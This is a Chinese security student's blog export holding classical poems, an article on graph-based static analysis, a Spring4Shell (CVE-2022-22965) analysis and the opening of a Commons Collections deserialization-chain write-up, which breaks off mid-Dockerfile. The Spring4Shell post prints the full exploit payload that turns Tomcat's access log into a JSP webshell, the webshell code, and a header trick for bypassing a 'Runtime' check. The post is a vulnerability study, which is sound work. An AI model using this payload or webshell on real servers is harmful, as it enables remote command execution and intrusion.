{"meta":{"title":"Math & Sec ，HACHp1的个人博客","subtitle":"Focus","description":"记录追逐时间的points与闪现的ideas。","author":"HACHp1","url":"https://hachp1.github.io"},"pages":[{"title":"About","date":"2018-04-04T13:18:45.000Z","updated":"2019-07-20T12:06:56.714Z","comments":true,"path":"about/index.html","permalink":"https://hachp1.github.io/about/index.html","excerpt":"","text":"某大学学僧，学习MachineLearning，学习Web安全ing。 啥都想学？啥都想学是不可能的，这辈子都不可能的，学一个又不够，就只能学几个才能维持得了生计这样子XD"},{"title":"归档","date":"2019-01-24T12:57:35.067Z","updated":"2019-01-24T12:57:35.067Z","comments":true,"path":"archive/index.html","permalink":"https://hachp1.github.io/archive/index.html","excerpt":"","text":""},{"title":"Categories","date":"2018-04-03T02:14:02.555Z","updated":"2017-08-31T04:13:03.000Z","comments":true,"path":"categories/index.html","permalink":"https://hachp1.github.io/categories/index.html","excerpt":"","text":""},{"title":"Tags","date":"2018-04-03T02:14:19.157Z","updated":"2017-08-31T04:13:03.000Z","comments":true,"path":"tags/index.html","permalink":"https://hachp1.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"点绛唇·乙巳蛇年有寄","slug":"点绛唇·乙巳蛇年有寄","date":"2025-01-28T14:33:41.000Z","updated":"2025-02-08T13:25:05.067Z","comments":true,"path":"posts/杂文/20250128-thinking4.html","link":"","permalink":"https://hachp1.github.io/posts/杂文/20250128-thinking4.html","excerpt":"","text":"点绛唇·乙巳蛇年有寄 神蜧衔珠，喜传春信人间驻。岁华新路，又换青红处。 柳眼初开，桃靥微羞语。东风顾，碧波深处，暗把韶光渡。","categories":[{"name":"杂文","slug":"杂文","permalink":"https://hachp1.github.io/categories/杂文/"}],"tags":[{"name":"心情随笔","slug":"心情随笔","permalink":"https://hachp1.github.io/tags/心情随笔/"}]},{"title":"点绛唇·乙巳除夕独念","slug":"点绛唇·乙巳除夕独念","date":"2025-01-28T14:18:33.000Z","updated":"2025-02-08T13:25:08.425Z","comments":true,"path":"posts/杂文/20250128-thinking3.html","link":"","permalink":"https://hachp1.github.io/posts/杂文/20250128-thinking3.html","excerpt":"","text":"点绛唇·乙巳除夕独念 一去寒流，暖阳轻抚佳人候。雁经声留，事过空回首。 烛暗灯昏，箸弃肴凉透。千古疚，举杯相酢，独对残更漏。","categories":[{"name":"杂文","slug":"杂文","permalink":"https://hachp1.github.io/categories/杂文/"}],"tags":[{"name":"心情随笔","slug":"心情随笔","permalink":"https://hachp1.github.io/tags/心情随笔/"}]},{"title":"江城子 甲辰随想","slug":"江城子-甲辰随想","date":"2024-02-10T10:22:11.000Z","updated":"2025-02-06T15:11:51.883Z","comments":true,"path":"posts/杂文/20240210-thinking2.html","link":"","permalink":"https://hachp1.github.io/posts/杂文/20240210-thinking2.html","excerpt":"","text":"江城子 甲辰随想 昨夜彩灯伴红绸，更难忆，往事悠。 清酒珍馐，缘是又春秋。杯举杯停攒玉箸，琐细事，尽等候。 城内暗河城外流，念今朝，似旧游。 岁月峥嵘，孤身踏风流。身起衣拂踱暗巷，天涯路，雾中求。","categories":[{"name":"杂文","slug":"杂文","permalink":"https://hachp1.github.io/categories/杂文/"}],"tags":[{"name":"心情随笔","slug":"心情随笔","permalink":"https://hachp1.github.io/tags/心情随笔/"}]},{"title":"基于图数据库的静态分析技术初探（一）","slug":"基于图数据库的静态分析技术初探（一）","date":"2022-07-23T15:07:01.000Z","updated":"2025-02-06T15:11:51.554Z","comments":true,"path":"posts/静态分析/20220723-graph-sa-1.html","link":"","permalink":"https://hachp1.github.io/posts/静态分析/20220723-graph-sa-1.html","excerpt":"基于图数据库的静态分析技术初探（一） 基于图数据库的静态分析技术初探（一） 基本概念 代码属性图 Datalog 实例 BytecodeDL Tabby CodeQL 基于代码属性图/Datalog的静态分析技术的特点 缺陷 近年来，基于图数据库的静态分析技术大火，例如被Github收购的CodeQL已占据安全静态分析的半壁江山。本文浅析相关技术，抛砖引玉。","text":"基于图数据库的静态分析技术初探（一） 基于图数据库的静态分析技术初探（一） 基本概念 代码属性图 Datalog 实例 BytecodeDL Tabby CodeQL 基于代码属性图/Datalog的静态分析技术的特点 缺陷 近年来，基于图数据库的静态分析技术大火，例如被Github收购的CodeQL已占据安全静态分析的半壁江山。本文浅析相关技术，抛砖引玉。 基本概念 图数据库就是一种使用图结构进行存储和查询的数据库，其中节点和边用于对数据进行表示和存储。 与一般的数据库一致，图数据库的整个概念也重在表达“关系” 借用知乎上的简单例子（见：图数据库是什么？ - 星环科技的回答 - 知乎 https://www.zhihu.com/question/310467190/answer/2494375788）： 来看一个经典三角恋：从前，有个男人叫小帅，他有个弟弟叫小强，他们有个漂亮的邻居叫小美，他们三个在同一所学校读书。小帅喜欢小美，小强也喜欢小美，但小美不喜欢小强，小美喜欢的人是小帅。 光看这段话，感觉有一堆略复杂的关系，用属性图来表示为： 图数据库通常有两大类，一种是属性图，另一种是RDF图；在代码分析上一般都使用属性图。 属性图由顶点（圆圈）、边（箭头）、属性（key:value）组成，在以上的例子中，Student为label，name:xx为property的key和value。 与传统的关系型数据库相比，关系型数据库的一组数据是线性的，而图数据库由结点和边构成，能够表示更为复杂的关系： 以下是3张表：学生、学生选课情况和课程，现在想要查到小美选的所有课程，在线性的关系数据库中查询起来非常麻烦： v2-8bf361a18ae54dd4446dd1402105ef2a_720w.jpg 而在图数据库中查询起来十分方便，只需通过”选课“边查询小美结点的连接情况即可： v2-85bb3aff036451da641a3905ce99e42a_720w.jpg 与传统关系型数据库相比，图数据库有以下优势： 更好的解释性：用户可以很自然的表达现实世界中的实体及其关联关系（对应图的顶点及边）。 更高的检索性能：传统关系型数据库多个表之间连接操作、外键约束，导致较大的额外开销。而图模型固有的数据索引结构，使得它的数据查询与分析速度更快。 更灵活：图数据可以表示更复杂的关系结构，图数据灵活的数据模型可以适应不断变化的业务需求，任意添加或删除顶点、边，扩充或者缩小图模型这些都可以轻松实现。 由于有以上优点，最近基于图数据库的静态分析技术大火。 代码属性图 代码属性图，先拆分一下：代码-属性图。代码属性图其实就是用属性图来表示代码。常见的代码属性图有：AST、CFG、DFG、PDG等。 以devign论文中的图为例： 任何一种以某IR（这里的IR是广义的IR，不是必须要三地址码）的属性图来表示代码本身的形式，都可以称为代码属性图。 基于代码属性图的静态分析，关键在于如何构建代码属性图（包括结点的定义、边的定义）以及如何定义推理/查询过程。代码属性图的定义对应了传统静态分析中的IR的定义，推理过程的定义则对应传统分析中的污点流分析过程。 通常来讲，对于不同特性的语言、不同的需求和场景，需要给出合适的代码属性图定义。 特别的，在Java利用链的挖掘问题下，不仅需要在污点分析阶段（类方法summary）用到基本的代码属性图（CFG），在污点分析结束后，可以将分析结果（一般为类方法的调用关系图）进一步输入到图数据库中，然后由安全人员编写查询语句，以辅助其挖掘调用链。比如BytecodeDL、Tabby。 Datalog 在看代码属性图之前，通过《南京大学软件分析》课程中的内容，先看一下Datalog（作为BytecodeDL的前置知识） 简介： Datalog：是声明式编程语言，是Prolog的子集，最初用于数据库，现在广泛应用于程序分析、网络定义、大数据、云计算等。 Datalog=Data+Logic；Datalog没有副作用（没有赋值）、没有控制流、没有函数、非图灵完备。 相关概念： 谓词Predicate：看作一系列陈述的集合，陈述某事情的事实（真假）。如Age，表示一些人的年龄。在真实使用场景下，一般为一个前置条件或一个由条件得到的结论。 事实Fact：表示一个组合是否属于一种关系，比如(“Xiaoming”, 18)可以表示“Xiaoming的年龄是18岁”，但注意这个陈述不一定值为True。 以指针分析为例： 首先，我们根据过程内指针分析的4条基本规则，得到以下四种推导关系： New(x: V,o: O) &lt;- i: x = new T() Assign(x : V, y : V) &lt;- x=y Store(x : V, f : F, y : V) &lt;- x.f = y Load(y : V, x : V, f : F) &lt;- y = x.f 将这4个推导关系输入datalog引擎，引擎会在数据库中自行推导（进行有收敛地迭代），达到不动点时，即完全指针分析。 实例 Tabby：字节码-&gt;soot-&gt;cfg-&gt;neo4j-&gt;neo4j查询 BytecodeDL：Soufflé（字节码-&gt;soot-&gt;cfg）-&gt;基于Soufflé(datalog)推理的污点分析-&gt;（反序列化链挖掘场景下）neo4j查询 CodeQL：自己实现的一套将源码转属性图的算法（未开源）-&gt;自己实现的一套查询语法（类似于sql） BytecodeDL BytecodeDL基于Doop，Doop基于souffle，实际上是在Souffle推理引擎下，使用自己实现的datalog来进行污点分析、类方法调用分析等个性化推理。对于java链子的查找问题，BytecodeDL将类方法的调用关系储存到neo4j中，然后在neo4j中进一步对结果进行筛选、查询。 先来看看souffle（以下例子可在：如何快速上手指针分析工具doop？ - 澪同学的回答 - 知乎 https://www.zhihu.com/question/499028330/answer/2473710030 中找到）： 可以在http://plang1.it.usyd.edu.au:8000/中执行： 12345678.decl edge(n: symbol, m: symbol)edge(&quot;a&quot;, &quot;b&quot;).edge(&quot;b&quot;, &quot;c&quot;).edge(&quot;c&quot;, &quot;d&quot;)..decl reachable (n: symbol, m: symbol).output reachablereachable(x, y):- edge(x, y).reachable(x, z):- edge(x, y), reachable(y, z). 解释： souffle以.decl edge(n: symbol, m: symbol)的形式来定义关系，symbol为属性的类型（symbol为字符串，此外还有 number）；在上面的例子中，定义了两个关系（edge和reachable）： 12.decl edge(n: symbol, m: symbol).decl reachable (n: symbol, m: symbol) 然后，上例中给出了几个基本条件（facts）用于推理： 123edge(&quot;a&quot;, &quot;b&quot;).edge(&quot;b&quot;, &quot;c&quot;).edge(&quot;c&quot;, &quot;d&quot;). 之后，定义了两种推理过程： 12reachable(x, y):- edge(x, y).reachable(x, z):- reachable(x, y), reachable(y, z). 以上表达式，说明由冒号右边可以推理出冒号左边（是不是很想数学的箭头证明），上面的第一句表示，如果x和y由边连接，那么可以推理出x与y可达；第二句表示，如果x和y由边连接，且y和z可达，那么x和z可达。 这个过程其实与数学归纳法一致： 归纳奠基：facts 归纳推理：以上的推理过程 .output reachable则表示要输出的内容，最后的执行结果： BytecodeDL的进一步学习在下一篇文章中进行。 Tabby 主要针对Java各种链（反序列化链、JNDI链等，通常是Java对象可控的情况下挖掘对应的链子）的半自动挖掘。设计了面向Java语言的代码属性图构建方案，包括类关系图、函数别名图、精确的函数调用图。函数别名图将所有的函数实现关系进行了聚合。 CodeQL 自己实现的一套将源码转属性图的算法（未开源）-&gt;自己实现的一套查询语法（类似于sql）。 基于代码属性图/Datalog的静态分析技术的特点 优点 编写门槛低，易于理解；这也是图静态分析大火的主要原因，只需要编写查询语句/简单的推导语句即可完成污点分析，对于推广来说十分方便。并且基于这个优点，安全人员针对具体场景进行定制化也比较容易。 这一点可以展开说，传统的静态分析工具（基于AST等的）一般是把污点分析过程写死了，只提供给安全人员污点函数和污点本身的自定义化的接口或规则编写接口，灵活度不够。而基于图的分析工具，则把污点传播的过程的定义也交给安全人员，安全人员通过查询语句/Datalog对这个过程进行定制化的编写，这样看来灵活度更大。 实际上，传统基于AST/CFG的静态分析能做到的事情更多（上限更高），但开发门槛太高，不便直接把污点传播过程的定制化交由安全人员处理。但基于Datalog或查询的图静态分析正因为编写门槛低，其定制化过程也不够灵活，外加其固有缺陷，很多过程都无法处理，即使能够处理，查询语句往往也很复杂，脱离了其简洁化的初衷。 方便编写和处理细致程度实际上是一对矛盾，针对不同场景选择合适的方法才是根本。 推导速度快（与图数据库一致） Datalog与图查询对比 Datalog与图查询相比，Datalog更偏重于类似数学归纳的过程，关注一个子句并将其循环作用在程序上，而图查询更倾向于使用者通过一系列查询语句来描述从源到污点的整个污点流的过程。 Datalog一般用于做基本的污点分析，可以把分析结果转存为图数据库，然后进行进一步查询和分析，所以Datalog和图查询不是相互替代的 ## 缺陷 基于代码属性图/Datalog的静态分析有以下缺点： 表达能力受限，非图灵完备，有的情况处理不了 比如有的时候需要中途去掉一些sinks，Datalog就无法实现，因为推理过程不考虑程序的顺序 再比如表达单个存在很容易，但表达同时满足多个存在比较困难，通常需要双重否定（以下例子中，if中的两个条件要同时满足才能到达污点，而datalog在单次推理时只会输入$a=1或$b=2，要表达“同时”，则需要双重否定：$a!=2或$b!=2的否定）： 12345678&lt;?php $a = 1;$b = 2;if ($a == 2 and $b == 2)&#123; eval($_GET[1]);&#125; 不能完全控制性能（底层已经实现了，无法再进行优化）","categories":[{"name":"静态分析","slug":"静态分析","permalink":"https://hachp1.github.io/categories/静态分析/"}],"tags":[{"name":"静态分析","slug":"静态分析","permalink":"https://hachp1.github.io/tags/静态分析/"}]},{"title":"Spring4Shell简析（CVE-2022-22965）","slug":"Spring4Shell简析（CVE-2022-22965）","date":"2022-04-14T13:44:06.000Z","updated":"2025-02-06T15:11:51.008Z","comments":true,"path":"posts/Web安全/20220414-spring4shell.html","link":"","permalink":"https://hachp1.github.io/posts/Web安全/20220414-spring4shell.html","excerpt":"Spring4Shell简析（CVE-2022-22965） Spring4Shell简析（CVE-2022-22965） 简介 漏洞存在条件 参数绑定 初识 嵌套型 环境搭建及复现 漏洞分析 Tomcat日志与AccessLogValve 为什么部署方式必须为Tomcat war包部署 为什么要JDK 9+ 可利用程度 总结 参考资料","text":"Spring4Shell简析（CVE-2022-22965） Spring4Shell简析（CVE-2022-22965） 简介 漏洞存在条件 参数绑定 初识 嵌套型 环境搭建及复现 漏洞分析 Tomcat日志与AccessLogValve 为什么部署方式必须为Tomcat war包部署 为什么要JDK 9+ 可利用程度 总结 参考资料 简介 继去年年底爆出的Log4shell漏洞在安全圈造成巨大影响的阴影下，今年3月底的Spring4shell（也有叫Spring Beans RCE的）消息刚刚放出，就在坊间流传开来。但由于前一次的某事件，这回漏洞详情来得很平静，也没有听说过有大面积的利用事件产生。这无疑给该漏洞带来很多神秘色彩。 目前网上已有不少的分析文章，此篇仅作为自己学习和理解的记录。看了一圈，发现Spring 远程命令执行漏洞（CVE-2022-22965）原理分析和思考写的比较好，本文主要是基于这篇文章的复现和个人理解。 这个漏洞基于CVE-2010-1622，是该漏洞的补丁绕过，该漏洞即Spring的参数绑定会导致ClassLoader的后续属性的赋值，最终能够导致RCE。而CVE-2022-22965的利用方式参考了Struts2 S2-020在Tomcat 8下的命令执行分析的方法 漏洞存在条件 JDK 9+ 直接或者间接地使⽤了Spring-beans包（Spring boot等框架都使用了） Controller通过参数绑定传参，参数类型为非常规类型的对象（比如非String等类型的自定义对象） Web应用部署方式必须为Tomcat war包部署 参数绑定 初识 参数绑定使程序员编写请求处理时，能够很方便地指定获取的参数以及其类型，并且能够通过请求的参数改变对象的属性： 123456789@RestControllerpublic class IndexController &#123; @RequestMapping(\"/test\") String test(TestBean testBean)&#123; testBean.setName(\"My test\"); return testBean.getName(); &#125;&#125; 如果这里我们访问url：127.0.0.1:8080/test?name=123，那么testBean对象的name属性将会被赋值为123。 嵌套型 Controller： 1234567@Controllerpublic class UserController &#123; @RequestMapping(\"/addUser\") public @ResponseBody String addUser(User user) &#123; return \"OK\"; &#125;&#125; User.java： 1234567891011121314151617181920public class User &#123; private String name; private Department department; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public Department getDepartment() &#123; return department; &#125; public void setDepartment(Department department) &#123; this.department = department; &#125;&#125; Department.java： 1234567891011public class Department &#123; private String name; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125;&#125; 当访问/addUser?name=test&amp;department.name=SEC时，user对象的name被赋值为test，并且其成员变量department的name属性被赋值为SEC 环境搭建及复现 选择Spring4Shell PoC Application，加入远程debug相应环境变量。与java 8不同的是，java 9之后的远程调试默认不支持外部IP，需要更改为: 1ENV JAVA_TOOL_OPTIONS -agentlib:jdwp=transport=dt_socket,address=*:10087,server=y,suspend=n 访问： http://10.136.127.22:10086/helloworld/greeting 使用自带的exp进行攻击： 1python .\\exploit.py --url http://10.136.127.22:10086/helloworld/greeting 可以去/usr/local/tomcat/webapps/ROOT看到生成的webshell： 1&lt;% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125; %&gt;// 漏洞分析 首先看Controller，参数绑定了Greeting类的对象greeting： 123456789@Controllerpublic class HelloController &#123;@PostMapping(\"/greeting\") public String greetingSubmit(@ModelAttribute Greeting greeting, Model model) &#123; return \"hello\"; &#125;&#125; 攻击payload为： 1class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= 攻击发起的get请求的请求头为： 123456get_headers = &#123; \"prefix\": \"&lt;%\", \"suffix\": \"%&gt;//\", # This may seem strange, but this seems to be needed to bypass some check that looks for \"Runtime\" in the log_pattern \"c\": \"Runtime\",&#125; 简单分析一下，相当于发送了以下参数： class.module.classLoader.resources.context.parent.pipeline.first.pattern=带有某前缀和后缀的[jsp webshell] class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp class.module.classLoader.resources.context.parent.pipeline.first.directory=shell的文件名（不含后缀） class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell的储存路径（相对路径，默认为webapps/ROOT） class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=(空) 其中的webshell大概为（是个有回显的简单的一句话）： 12345678%&#123;prefix&#125;i java.io.InputStream in = %&#123;c&#125;i.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125; %&#123;suffix&#125;i 该漏洞中，攻击者可以对绑定对象的class属性进行随意赋值，有点像原型链污染。在exp中，是利用class属性来修改Tomcat的⽇志配置，向⽇志中写⼊shell。 一些细节： 这些payload可以分开发送，也可以合并在一次请求中，这些属性的修改是直接影响内存的（像原型链污染），不会像php一样，下一次请求又复原。 为了简化分析流程，我们仅post传入class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp，其他的参数都是类似的。 我们来跟一下参数绑定的解析过程，首先是org\\springframework\\spring-web\\5.3.15\\spring-web-5.3.15-sources.jar!\\org\\springframework\\web\\bind\\WebDataBinder.java#198，在WebDataBinder#doBind方法中: 12345678910...public class WebDataBinder extends DataBinder &#123;... @Override protected void doBind(MutablePropertyValues mpvs) &#123; checkFieldDefaults(mpvs); checkFieldMarkers(mpvs); adaptEmptyArrayIndices(mpvs); super.doBind(mpvs);//跟进此处 &#125; 跟进去，此处省略n层，到org/springframework/beans/AbstractNestablePropertyAccessor.java#814，getPropertyAccessorForPropertyPath方法被传入当前的待解析参数属性，并且尝试解析嵌套的情况，出现嵌套时，从左边开始挨个递归解析，比如此处的属性为class.module.classLoader.resources.context.parent.pipeline.first.suffix，将会解析最左边的class： 1234567891011121314 protected AbstractNestablePropertyAccessor getPropertyAccessorForPropertyPath(String propertyPath) &#123; int pos = PropertyAccessorUtils.getFirstNestedPropertySeparatorIndex(propertyPath); // Handle nested properties recursively. if (pos &gt; -1) &#123; String nestedProperty = propertyPath.substring(0, pos); String nestedPath = propertyPath.substring(pos + 1); AbstractNestablePropertyAccessor nestedPa = getNestedPropertyAccessor(nestedProperty);//进入这里 return nestedPa.getPropertyAccessorForPropertyPath(nestedPath);//递归调用，每次解析一级 &#125; else &#123; return this; &#125;&#125; 然后继续跟进： 12345678910 private AbstractNestablePropertyAccessor getNestedPropertyAccessor(String nestedProperty) &#123; if (this.nestedPropertyAccessors == null) &#123; this.nestedPropertyAccessors = new HashMap&lt;&gt;(); &#125; // Get value of bean property. PropertyTokenHolder tokens = getPropertyNameTokens(nestedProperty); String canonicalName = tokens.canonicalName; Object value = getPropertyValue(tokens); //跟进这里 ...&#125; 继续跟进： 12345678910111213 @Nullableprotected Object getPropertyValue(PropertyTokenHolder tokens) throws BeansException &#123; String propertyName = tokens.canonicalName; String actualName = tokens.actualName; PropertyHandler ph = getLocalPropertyHandler(actualName);//这里的ph包含了待获取的\"class\"信息 if (ph == null || !ph.isReadable()) &#123; throw new NotReadablePropertyException(getRootClass(), this.nestedPath + propertyName); &#125; try &#123; Object value = ph.getValue(); //跟进这里 ... &#125; ... 此处的ph变量是BeanWrapperImpl对象，该对象装饰了java bean（在这里是Greeting对象），并提供对其属性（这里传入了“class”字符串，获取的是class属性）的获取和更改（get和set），之后调用的ph.getValue();会获取Greeting对象的class属性：跟进去之后，在org/springframework/beans/BeanWrapperImpl.java#getValue中会获取到java.lang.Class java.lang.Object.getClass()，从而使class被解析为java.lang.Object.Class类的对象（具体值为class com.reznok.helloworld.Greeting）： 123456789101112 @Override@Nullablepublic Object getValue() throws Exception &#123; Method readMethod = this.pd.getReadMethod(); // 这一步获取到 java.lang.Class java.lang.Object.getClass() if (System.getSecurityManager() != null) &#123; ... &#125; else &#123; ReflectionUtils.makeAccessible(readMethod); return readMethod.invoke(getWrappedInstance(), (Object[]) null); // &#125;&#125; 这里会返回Greeting的class属性。到这里，单次解析过程分析完毕。我们来对照一下过程：我们现在在解析class.module.classLoader.resources.context.parent.pipeline.first.suffix中的class，而当前绑定参数对象为Greeting类的对象，所以实际上是调用了Greeting.getClass() 然后我们来跟下一层解析，即module.classLoader.resources.context.parent.pipeline.first.suffix中的module的解析。我们再来看解析的入口，即递归处，此时的nestedPa为上一步解析出的java.lang.Object.Class对象，根据前一步的分析，这里会尝试获取该对象的module属性，即会调用java.lang.Object.Class.getModule() 12345678910111213141516 protected AbstractNestablePropertyAccessor getPropertyAccessorForPropertyPath(String propertyPath) &#123; int pos = PropertyAccessorUtils.getFirstNestedPropertySeparatorIndex(propertyPath); // Handle nested properties recursively. if (pos &gt; -1) &#123; String nestedProperty = propertyPath.substring(0, pos); String nestedPath = propertyPath.substring(pos + 1); AbstractNestablePropertyAccessor nestedPa = getNestedPropertyAccessor(nestedProperty); //经过第一层的解析，nestedPa变成了java.lang.Object.Class对象 return nestedPa.getPropertyAccessorForPropertyPath(nestedPath);//递归调用，每次解析一级 &#125; else &#123; return this; &#125;&#125; 此时获取到的是一个java.lang.Module对象。 类似地，依次进行各层的解析，总体解析过程为： 123456789User.getClass() java.lang.Class.getModule() java.lang.Module.getClassLoader() org.apache.catalina.loader.ParallelWebappClassLoader.getResources() org.apache.catalina.webresources.StandardRoot.getContext() org.apache.catalina.core.StandardContext.getParent() org.apache.catalina.core.StandardHost.getPipeline() org.apache.catalina.core.StandardPipeline.getFirst() org.apache.catalina.valves.AccessLogValve.setSuffix() 需要注意的是，最后一层是整个嵌套解析结束后，调用setPropertyValue时会对得到的属性进行赋值。利用时是对org.apache.catalina.AccessLog属性进行赋值。 该过程中，java.lang.Module.getClassLoader()得到org.apache.catalina.loader.ParallelWebappClassLoader这步的跨度较大，这步很关键，在后文war包部署部分会详细介绍。 其他的几个属性解析赋值的过程类似。 Tomcat日志与AccessLogValve 下面我们来详细看一下Tomcat日志相关的部分，首先是exp中设置的几个属性，它们的作用为： pattern：日志的文件内容格式；其中，pattern有一些特殊的语法，比如%{xxx}i表示获取请求的header中的xxx头的值，并将其打印到日志中 suffix：日志文件名后缀 directory：日志文件路径 prefix：日志文件名前缀 fileDateFormat：文件名日期后缀，默认为.yyyy-MM-dd 参考：Access Log Valve 为什么攻击时用于产生日志的get请求中，请求的header会有&quot;c&quot;: &quot;Runtime&quot;？在pattern中是包含了%{c}i这一格式化记录数据的，所以c的值会被替换为Runtime。只要得到的日志文件没有语法错误，不使用这种方法也能利用成功，但是需要注意的是，http头中的信息在记录到日志文件中时，会对双引号进行转义，而在pattern中直接赋值时不会转义，所以直接在header中传入webshell会导致shell无法成功执行。 为什么部署方式必须为Tomcat war包部署 LaunchedURLClassLoader是以jar的形式启动Spring boot的加载器来加载/lib下面的jar，LaunchedURLClassLoader和普通的URLClassLoader的不同之处是，它提供了从Archive里加载.class的能力。参考：spring boot应用启动原理分析 在利用时，存在java.lang.Module.getClassLoader()得到org.apache.catalina.loader.ParallelWebappClassLoader这一步，ParallelWebappClassLoader只能是war包部署时的返回值；如果使用jar包的形式进行部署，则此步获取到的对象是org.springframework.boot.loader.LaunchedURLClassLoader，该类下没有resources成员变量，导致利用链断掉。 为什么要JDK 9+ 前面提到，该漏洞是对CVE-2010-1622的绕过，这个绕过是出现在9+之后对模块化的支持上的，在org/springframework/beans/CachedIntrospectionResults.java#CachedIntrospectionResults#289中有对CVE-2010-1622的修复补丁： 12345678910111213...public final class CachedIntrospectionResults &#123; ... private CachedIntrospectionResults(Class&lt;?&gt; beanClass) throws BeansException &#123; ... for (PropertyDescriptor pd : pds) &#123; if (Class.class == beanClass &amp;&amp; (\"classLoader\".equals(pd.getName()) || \"protectionDomain\".equals(pd.getName()))) &#123; // Ignore Class.getClassLoader() and getProtectionDomain() methods - nobody needs to bind to those continue; &#125; if (logger.isTraceEnabled()) &#123; ... 注意到条件if (Class.class == beanClass &amp;&amp; (&quot;classLoader&quot;.equals(pd.getName()) || &quot;protectionDomain&quot;.equals(pd.getName())))，该条件的意思是，如果当前的对象的类为Class.class（即java.lang.Class），并且下一个要解析的属性名为classLoader或protectionDomain，就直接contine，不会再解析该层。而在Spring4shell的绕过中，由于JDK 9+对模块化进行了支持，实现了getModule方法，从而可以通过该方法得到的Module进一步获取classLoader，而不是直接使用Class的getClaasLoader()去获取。 具体来讲就是把 12Xxx.getClass() java.lang.Class.getClassLoader() 替换成 123Xxx.getClass() java.lang.Class.getModule() java.lang.Module.getClassLoader() 从而绕过该补丁。 可利用程度 首先，我们假设受害者已满足JDK 9+，并且使用了Spring bean，此外还有一个不是很容易满足的条件： Web应用部署方式必须为Tomcat war包部署（jar的形式则不行） 然后，攻击者需要知道存在漏洞的url路由，这和应用的业务息息相关。 所以该漏洞虽然是核弹级，但要在真实情况下找到满足这些条件的情形还是比较少的。这也许能解释为什么漏洞爆出后，在野利用的反响远远不如Log4shell那么大。 官方补丁 官方的补丁为：https://github.com/spring-projects/spring-framework/commit/002546b3e4b8d791ea6acccb81eb3168f51abb15，具体来说，修复后的程序仅允许对属性描述符为name或以Name结尾的属性进行赋值，从而防止classLoader和Module以及之后的属性被赋值。 总结 该漏洞是在spring bean解析参数绑定时，对对象属性进行赋值时没有对classLoader进行限制造成。 开发者要实现的功能：支持参数绑定时向对象的属性进行赋值操作。漏洞出现的原因：能对classLoader之后的其他属性进行赋值，从而修改了一些重要的全局变量导致getshell（比如这里修改了日志文件的文件名、内容，导致写入webshell）。 该洞的利用过程是查找一系列的getXXX链，然后可以设置其值为任意字符串，exp中通过设置tomcat日志相关属性以写入webshell。这个链的查找过程应该是很有难度的，除了写日志这条链，还可以尝试去发现其他的利用链，但过程应该很难。 该漏洞与原型链污染有相似的地方（污染现有对象的属性达到利用），与python模板注入也有相似的地方（通过链式的形式在对象成员属性或继承链之间跨越，以达到能够利用的属性处）。 参考资料 p1n93r师傅的pdf Spring 远程命令执行漏洞（CVE-2022-22965）原理分析和思考 Spring4Shell PoC Application Access Log Valve CVE-2022-22965: Spring Framework RCE via Data Binding on JDK 9+ 分析 Struts2 S2-020在Tomcat 8下的命令执行分析 spring boot应用启动原理分析","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://hachp1.github.io/categories/Web安全/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://hachp1.github.io/tags/Web安全/"}]},{"title":"Commons Collections链分析","slug":"Commons-Collections链分析","date":"2022-04-07T01:23:09.000Z","updated":"2025-02-06T15:11:50.433Z","comments":true,"path":"posts/Web安全/20220407-cc_analysis.html","link":"","permalink":"https://hachp1.github.io/posts/Web安全/20220407-cc_analysis.html","excerpt":"Commons Collections链分析 Commons Collections链分析 前言 环境搭建 Transformer接口的各种实现（用作POP链的关键链结） Transformer接口 ConstantTransformer类 InvokerTransformer类 InstantiateTransformer类 ChainedTransformer类 CC1 Proxy类 AnnotationInvocationHandler类 LazyMap类 jdk 1.8 中的修复 CC3 TrAXFilter类 TemplatesImpl类 CC2 PriorityQueue类 TransformingComparator类 CC4 CC5 BadAttributeValueExpException类 TiedMapEntry类 idea调试的坑 CC6 HashMap类 TiedMapEntry类 CC7 Hashtable类 LazyMap类进一步理解以及HashMap 一些细节 URLDNS 总结 参考资料","text":"Commons Collections链分析 Commons Collections链分析 前言 环境搭建 Transformer接口的各种实现（用作POP链的关键链结） Transformer接口 ConstantTransformer类 InvokerTransformer类 InstantiateTransformer类 ChainedTransformer类 CC1 Proxy类 AnnotationInvocationHandler类 LazyMap类 jdk 1.8 中的修复 CC3 TrAXFilter类 TemplatesImpl类 CC2 PriorityQueue类 TransformingComparator类 CC4 CC5 BadAttributeValueExpException类 TiedMapEntry类 idea调试的坑 CC6 HashMap类 TiedMapEntry类 CC7 Hashtable类 LazyMap类进一步理解以及HashMap 一些细节 URLDNS 总结 参考资料 前言 CC链，作为Java反序列化漏洞学习的必修部分，在这里填个坑。 环境搭建 老样子，用Docker远程调试是最方便的，在这里根据javasec构建自己的docker镜像： 漏洞环境与javasec基本一致，只不过使用spring boot设置了一系列路由，然后使用mvn构建jar包： 1mvn clean install -DskipTests 然后是构造dockerfile，java版本有限制，版本需要比7u21小，找了一大圈没有现成的镜像，只能自己构建。最后得到的环境能够复现除CC5之外的其他链（CC5需要jdk 1.8）。 Docker file: 123456789101112131415FROM ubuntu:18.04RUN apt-get updateRUN apt-get install -y iputils-pingADD jdk-7u21-linux-x64.tar.gz /usr/localENV 